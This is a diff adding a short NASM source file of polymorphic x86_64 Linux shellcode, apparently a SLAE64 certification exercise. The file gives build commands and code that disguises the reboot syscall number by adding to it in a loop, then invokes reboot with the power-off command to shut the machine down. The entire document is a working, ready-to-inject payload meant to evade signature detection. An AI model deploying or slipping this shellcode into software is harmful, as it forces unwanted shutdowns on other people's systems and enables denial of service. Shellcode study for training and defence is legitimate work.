@@ -1,0 +1,29 @@
+;Title: polymorphic reboot shellcode
+;Author: d4sh&r
+;Architecture:linux x86_64
+;SLAE64-1379
+;Description:
+;Polymorphic shellcode in 25 bytes to power off the PC 
+;Tested on : Linux kali64 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 x86_64 GNU/Linux
+ 
+;Compilation and execution
+;nasm -felf64 reboot.nasm -o reboot.o
+;ld reboot.o -o reboot
+
+; reboot(LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,LINUX_REBOOT_CMD_POWER_OFF)
+
+section .text
+
+global _start
+
+_start:
+    mov al,0x9
+    mov edx, 0x4321fedc
+    mov cl,0x2
+    mov esi, 0x28121969
+reboot:
+    add al,80
+    mov edi, 0xfee1dead
+    loop reboot
+    ;mov al,  0xa9
+    syscall
